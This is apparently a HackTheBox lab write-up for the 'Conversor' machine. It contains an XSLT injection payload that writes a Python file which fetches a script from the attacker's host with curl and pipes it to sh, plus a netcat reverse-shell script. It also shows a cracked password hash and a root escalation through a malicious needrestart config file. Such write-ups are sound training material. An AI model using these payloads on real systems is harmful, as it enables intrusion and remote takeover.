---
title: HackTheBox Conversor Writeup
authors: Shobhit
date: 2025-10-31 12:34:00 +0530
categories: [HackTheBox, Machines]
tags: [HTB,Linux,XML,XSLT,Injection-Attack]
math: true
mermaid: true
---

![Conversor - HTB](/assets/img/writeups/Conversor-HTB/Conversor.png)

## Initial Enumeration

### Nmap Scan

```console

$ Nmap scan report for conversor.htb (10.10.11.92)
Host is up, received echo-reply ttl 63 (0.73s latency).
Scanned at 2025-10-31 12:40:00 IST for 52s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-title: Login
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:40
Completed NSE at 12:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:40
Completed NSE at 12:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:40
Completed NSE at 12:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.74 seconds
           Raw packets sent: 1177 (51.764KB) | Rcvd: 1130 (45.196KB)
```

As Expected this is easy box so,
There are two open ports:

* **22** (`SSH`)
* **80** (`HTTP`)

We are also provided with the `conversor.htb` hostname in the box, so we add it to our `hosts` file:

```
10.10.11.92 conversor.htb
```
{: file="/etc/hosts" }

Visiting `http://conversor.htb/`, there is not much; we only see two buttons:

![Web 80 Index](/assets/img/writeups/Conversor-HTB/1.png){: width="1200" height="600"}

The Basic login page found.so now create a new account

![Web 80 Index](/assets/img/writeups/Conversor-HTB/2.png){: width="1200" height="600"}

after register a new user get the file upload feature in `XML` and `XSLT` file format.

### Directory Bruteforcing

```console

$ gobuster dir -u http://conversor.htb -w /usr/share/wordlists/dirb/common.txt -t 25
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://conversor.htb
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2842]
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/login                (Status: 200) [Size: 722]
/logout               (Status: 302) [Size: 199] [--> /login]
/register             (Status: 200) [Size: 726]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

There is nothing intersting finds here, so get look to the file upload functionality.

## Exploitation

### User Access

so it required the both formats of file but it's look like the XSLT injection can be possible 

Firstly i detected the environment by using the payload:

```xml

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/">
    <detection>
      <vendor><xsl:value-of select="system-property('xsl:vendor')"/></vendor>
      <version><xsl:value-of select="system-property('xsl:version')"/></version>
      <vendor-url><xsl:value-of select="system-property('xsl:vendor-url')"/></vendor-url>
      
      <!-- Test various functions -->
      <function-document><xsl:value-of select="function-available('document')"/></function-document>
      <function-unparsed-text><xsl:value-of select="function-available('unparsed-text')"/></function-unparsed-text>
      <function-system-property><xsl:value-of select="function-available('system-property')"/></function-system-property>
    </detection>
  </xsl:template>
</xsl:stylesheet>
```

![web-index](/assets/img/writeups/Conversor-HTB/3.png){: width="1200" height="600"}

got the  libxslt (the common XSLT processor used in Linux environments)

so it execute the payload the vulnerability is confirmed now try for gaining access through reverse-connection.

```xml

<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exploit="http://exslt.org/common"
    extension-element-prefixes="exploit"
    version="1.0">
<xsl:template match="/">
<exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.16.19:8000/shell.sh|sh")
</exploit:document>
</xsl:template>
</xsl:stylesheet>
```
* save this as `xslt` file format 

```shell.sh

#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.19 4444 >/tmp/f
```

also have to spin up the python server

```console

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
and make sure `nc -lnvp 4444` and wait for few seconds and get back the reverse shell.

```console

$ rlwrap nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.92 54554
bash: cannot set terminal process group (1912): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$
```

```console

$ www-data@conversor:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

find the only one user `fismathack` username. so in `/var/www/conversor.htb/instance` find the database which is `user.db`

```console

$ www-data@conversor:~/conversor.htb/instance$ strings users.db
strings users.db
SQLite format 3
?tablefilesfiles
CREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    ))
indexsqlite_autoindex_files_1files
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    ))
indexsqlite_autoindex_users_1users
Mtest098f6bcd4621d373cade4e832627b4f6.
!Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
test
!	fismathack
users
_650206ab-d9a9-4ac6-8cf3-02fbdd528f65
650206ab-d9a9-4ac6-8cf3-02fbdd528f65.htmlR
_377f2a40-4e91-44a6-84ec-e3e03bcb11e5
377f2a40-4e91-44a6-84ec-e3e03bcb11e5.htmlR
_8516729e-cb2c-46f8-a273-b46032e7aa88
8516729e-cb2c-46f8-a273-b46032e7aa88.htmlR
_08adec50-96fb-4625-bfcc-3216a4a1f023
08adec50-96fb-4625-bfcc-3216a4a1f023.htmlR
_a60d9972-1376-4db7-a6aa-60115b8c39a9
a60d9972-1376-4db7-a6aa-60115b8c39a9.htmlR
_564064fe-4a25-4a11-83f5-b502b592571c
564064fe-4a25-4a11-83f5-b502b592571c.htmlR
_ec96e81c-6b08-4666-bb69-b7a4bd1bf268
ec96e81c-6b08-4666-bb69-b7a4bd1bf268.htmlR
_3a599adc-54f3-4c80-9db3-577cc0c46212
3a599adc-54f3-4c80-9db3-577cc0c46212.htmlR
_99e1bc96-0a5f-4047-a55e-8d993c00dd9d
99e1bc96-0a5f-4047-a55e-8d993c00dd9d.htmlR
_ddef5227-a506-456f-8d1e-51ee35d92fdd
ddef5227-a506-456f-8d1e-51ee35d92fdd.htmlR	
_ad5fd061-dedb-4f06-82d0-c41cf70764ae
ad5fd061-dedb-4f06-82d0-c41cf70764ae.htmlR
_1363be8b-c6c8-4227-92cc-1367b434fb14
1363be8b-c6c8-4227-92cc-1367b434fb14.htmlR
_c3f1ec9b-1b2c-49d2-96a6-33aff7028391
c3f1ec9b-1b2c-49d2-96a6-33aff7028391.htmlR
_f06dc183-e13f-4f4c-8389-7e414d7fe573
f06dc183-e13f-4f4c-8389-7e414d7fe573.htmlR
_0facc6c2-7625-4240-9dd0-d1085335224c
0facc6c2-7625-4240-9dd0-d1085335224c.htmlR
_00508ffa-82dd-4c42-9867-7dd4a6b16605
00508ffa-82dd-4c42-9867-7dd4a6b16605.htmlR
_89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b
89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b.htmlR
_a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2
a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2.htmlR
_8374be69-0931-4445-8f58-5589d27ec7d7
8374be69-0931-4445-8f58-5589d27ec7d7.html
650206ab-d9a9-4ac6-8cf3-02fbdd528f65
377f2a40-4e91-44a6-84ec-e3e03bcb11e5
8516729e-cb2c-46f8-a273-b46032e7aa88
08adec50-96fb-4625-bfcc-3216a4a1f023
a60d9972-1376-4db7-a6aa-60115b8c39a9
564064fe-4a25-4a11-83f5-b502b592571c
ec96e81c-6b08-4666-bb69-b7a4bd1bf268
3a599adc-54f3-4c80-9db3-577cc0c46212
99e1bc96-0a5f-4047-a55e-8d993c00dd9d
ddef5227-a506-456f-8d1e-51ee35d92fdd
ad5fd061-dedb-4f06-82d0-c41cf70764ae	(
1363be8b-c6c8-4227-92cc-1367b434fb14
c3f1ec9b-1b2c-49d2-96a6-33aff7028391
f06dc183-e13f-4f4c-8389-7e414d7fe573
0facc6c2-7625-4240-9dd0-d1085335224c
00508ffa-82dd-4c42-9867-7dd4a6b16605
89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b
a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2
U	8374be69-0931-4445-8f58-5589d27ec7d7
```

* fismathack = 5b5c3ac3a1c897c94caad48e6c71fdec (this is encrypted)

Cracked password = "Keepmesafeandwarm"

```console

$ ssh fismathack@conversor.htb
fismathack@conversor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Oct 31 07:57:12 AM UTC 2025

  System load:  0.03              Processes:             234
  Usage of /:   64.3% of 5.78GB   Users logged in:       1
  Memory usage: 8%                IPv4 address for eth0: 10.10.11.92
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Oct 31 07:57:16 2025 from 10.10.16.19
fismathack@conversor:~$ cat user.txt
5aa695a8736b7eb5e84d3a607b439f5b
```

### Root access

```console

fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

```console

fismathack@conversor:~$ sudo /usr/sbin/needrestart --help

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v		be more verbose
    -q		be quiet
    -m <mode>	set detail level
	e	(e)asy mode
	a	(a)dvanced mode
    -n		set default answer to 'no'
    -c <cfg>	config filename
    -r <mode>	set restart mode
	l	(l)ist only
	i	(i)nteractive restart
	a	(a)utomatically restart
    -b		enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>	override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information

```
* -c <cfg>	config filename

with the -c can be used any config file so let's try to escalate the privilege

```console

fismathack@conversor:~$ cat > /tmp/exploit.conf << 'EOF'
> BEGIN { system("/bin/bash -p") }
%nrconf = (
    verbosity => 0,
    restart => 'a'
);
EOF
```

```console

fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /tmp/exploit.conf 
root@conversor:/home/fismathack# id
uid=0(root) gid=0(root) groups=0(root)
root@conversor:/home/fismathack# cat /root/root.txt
4d9ecc869da5dd756bfc496016016659

```

SEE YOU IN THE NEXT ONE:)
